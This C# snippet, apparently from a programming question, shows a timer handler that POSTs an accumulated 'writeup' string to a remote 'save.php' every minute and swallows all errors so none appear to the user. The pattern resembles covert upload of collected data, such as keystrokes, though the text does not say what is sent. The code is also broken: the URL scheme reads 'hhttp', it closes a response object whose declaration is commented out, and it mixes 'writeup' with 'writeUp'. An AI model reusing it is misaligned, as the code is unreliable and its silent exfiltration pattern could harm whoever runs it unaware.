    private void timer1_Tick(object sender, EventArgs e)    
    {
        string strServer = "hhttp://www.mydomain.net/save.php";
        try 
        {
            var reqFP = (HttpWebRequest)HttpWebRequest.Create(strServer);
    		
            reqFP.Method = "POST";
            reqFP.ContentType = "application/x-www-form-urlencoded";
       
            reqFP.ContentLength = writeup.Length;
    		
            /*var rspFP = (HttpWebResponse)reqFP.GetResponse();
            if (rspFP.StatusCode == HttpStatusCode.OK) 
            {*/
                //WRITE STRING TO STREAM HERE
                using (var sw = new StreamWriter(reqFP.GetRequestStream(), Encoding.ASCII))
                {
                    sw.Write(writeup);
                }   
    
                rspFP.Close(); //is good to open and close the connection every minute
            /*}*/		
        }
        catch (WebException) {
            //I don't know why to use try/catch... 
            //but I just don't want any errors to be poped up...
        }
        writeUp = "";
    }
